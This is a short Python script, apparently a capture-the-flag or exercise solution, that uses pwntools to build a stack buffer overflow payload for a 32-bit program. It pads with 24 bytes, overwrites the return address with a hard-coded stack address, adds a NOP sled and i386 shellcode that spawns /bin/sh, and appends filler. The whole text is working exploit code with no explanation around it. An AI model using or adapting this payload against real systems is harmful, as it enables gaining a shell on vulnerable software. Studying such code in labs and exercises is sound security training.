from pwn import *

ret_addr = 0xffffcc68				# ebp = 0xffffcc58
shellcode = shellcraft.i386.sh()

payload = "A" * 24
payload += p32(ret_addr)
payload += "\x90" * 20
payload += asm(shellcode)
payload += "C" * 169				# 24 + 4 + 20 + 44 + 169 = 261
